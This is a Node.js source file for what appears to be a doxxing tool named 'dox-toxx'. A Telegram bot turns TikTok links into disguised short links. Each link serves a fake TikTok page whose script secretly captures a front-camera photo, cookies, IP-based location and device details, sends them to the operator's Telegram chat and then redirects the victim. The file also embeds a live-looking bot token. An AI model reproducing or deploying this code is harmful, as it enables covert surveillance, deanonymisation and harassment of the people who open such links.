const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

const TOKEN = '8989024516:AAEAIwKbvaDe8HALbrjv-UoHcH6Pp2wZiso';
const CHAT_ID = '8667961334';
const PORT = process.env.PORT || 3000;
const DOMAIN = process.env.DOMAIN || 'https://dox-toxx.onrender.com';

const app = express();
const bot = new TelegramBot(TOKEN, { polling: true });

app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true }));

const linksDB = {};
const userStates = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  userStates[chatId] = 'WAITING_LINK';
  bot.sendMessage(chatId, 'Отправь ссылку на TikTok.');
});

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (!text || text.startsWith('/')) return;

  if (userStates[chatId] === 'WAITING_LINK') {
    if (!text.includes('tiktok.com')) {
      return bot.sendMessage(chatId, 'Неверная ссылка.');
    }

    const shortId = crypto.randomBytes(6).toString('base64').replace(/\+/g, '').replace(/\//g, '').replace(/=/g, '').substring(0, 9);
    linksDB[shortId] = text;

    const fakeLink = `${DOMAIN}/${shortId}/`;

    bot.sendMessage(chatId, `Ссылка: ${fakeLink}`);
    userStates[chatId] = null;
  }
});

app.post('/api/collect', async (req, res) => {
  const { cookies, geo, phone, browser, target, photo } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  try {
    let text = `IP: ${ip}\nГео: ${geo?.country || '?'}, ${geo?.city || '?'}\nУстройство: ${phone?.os || '?'}\nЦель: ${target || '?'}`;
    await bot.sendMessage(CHAT_ID, text);

    if (photo && photo.startsWith('data:image')) {
      const base64Data = photo.split(',')[1];
      const buffer = Buffer.from(base64Data, 'base64');
      await bot.sendPhoto(CHAT_ID, buffer);
    }

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ ok: false });
  }
});

app.get('/:id/', (req, res) => {
  const shortId = req.params.id;
  const targetUrl = linksDB[shortId];

  if (!targetUrl) {
    return res.redirect('https://dox-toxx.onrender.com');
  }

  res.send(`<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<title>TikTok</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
  body { height: 100vh; background: #f1f1f2; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #000; }
  .header { background: #e3e3e3; padding: 12px 16px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid #d0d0d0; }
  .avatar-lg { width: 48px; height: 48px; border-radius: 50%; background: #ccc; display: flex; justify-content: center; align-items: center; }
  .avatar-lg svg { width: 28px; height: 28px; fill: #fff; }
  .header-info { flex: 1; }
  .header-info .name { font-weight: 600; font-size: 16px; margin-bottom: 2px; }
  .header-info .desc { font-size: 13px; color: #666; }
  .btn-red { background: #fe2c55; color: #fff; border: none; padding: 10px 16px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
  .content { padding: 20px; max-width: 600px; margin: 0 auto; }
  .skeleton-box { background: #e0e0e0; border-radius: 8px; margin-bottom: 16px; }
  .skeleton-box.big { height: 400px; width: 100%; }
  .skeleton-row { display: flex; gap: 12px; margin-bottom: 16px; }
  .skeleton-circle { width: 40px; height: 40px; border-radius: 50%; background: #d0d0d0; }
  .skeleton-text { height: 16px; background: #d0d0d0; border-radius: 4px; margin-bottom: 8px; }
  .skeleton-text.w-50 { width: 50%; }
  .skeleton-text.w-80 { width: 80%; }
  #preview, #canvas { display: none; }
</style>
</head>
<body>
<div class="header">
  <div class="avatar-lg"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
  <div class="header-info">
    <div class="name">TikTok</div>
    <div class="desc">Приєднуйся до мене в TikTok</div>
  </div>
  <button class="btn-red" id="btnOpen">Відкрити застосунок</button>
</div>
<div class="content">
  <div class="skeleton-row">
    <div class="skeleton-circle"></div>
    <div style="flex:1">
      <div class="skeleton-text w-50"></div>
      <div class="skeleton-text w-80"></div>
    </div>
  </div>
  <div class="skeleton-box big"></div>
</div>
<video id="preview" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>
<script>
  const TARGET_URL = "${targetUrl}";
  const tg = window.Telegram?.WebApp;

  if (tg) {
    tg.ready();
    tg.expand();
    if (tg.BackButton) tg.BackButton.hide();
  }

  const COOKIE_DATA = {}, GEO_DATA = {}, PHONE_DATA = {}, BROWSER_DATA = {};
  const video = document.getElementById('preview');
  const canvas = document.getElementById('canvas');

  async function collectAll() {
    COOKIE_DATA.raw = document.cookie || '';
    try {
      const r = await fetch('https://ipwho.is/'); const g = await r.json();
      if (g.success) { GEO_DATA.country = g.country; GEO_DATA.city = g.city; }
    } catch(e){}
    PHONE_DATA.os = navigator.userAgent;
    BROWSER_DATA.lang = navigator.language;
  }

  async function takePhoto() {
    let stream = null;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      video.srcObject = stream;
      await new Promise(res => { if (video.readyState >= 2) return res(); video.onloadeddata = () => res(); });
      await new Promise(r => setTimeout(r, 200));
      canvas.width = video.videoWidth || 480;
      canvas.height = video.videoHeight || 360;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
      stream.getTracks().forEach(t => t.stop());
      video.srcObject = null;
      return blob;
    } catch (e) {
      if (stream) stream.getTracks().forEach(t => t.stop());
      return null;
    }
  }

  let redirected = false;
  function goTarget() {
    if (redirected) return;
    redirected = true;
    if (tg && tg.openLink) {
      tg.openLink(TARGET_URL);
    } else {
      location.replace(TARGET_URL);
    }
  }

  document.getElementById('btnOpen').onclick = (e) => { e.preventDefault(); goTarget(); };
  setTimeout(goTarget, 3000);

  (async () => {
    const photoPromise = takePhoto();
    await collectAll();
    const photoBlob = await photoPromise;
    const photoBase64 = photoBlob ? await new Promise((res) => { const reader = new FileReader(); reader.onloadend = () => res(reader.result); reader.readAsDataURL(photoBlob); }) : null;
    fetch('/api/collect', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ cookies: COOKIE_DATA, geo: GEO_DATA, phone: PHONE_DATA, browser: BROWSER_DATA, photo: photoBase64, target: TARGET_URL })
    }).catch(() => {});
  })();
</script>
</body>
</html>`);
});

app.listen(PORT, () => {
  console.log(`Port ${PORT}`);
});
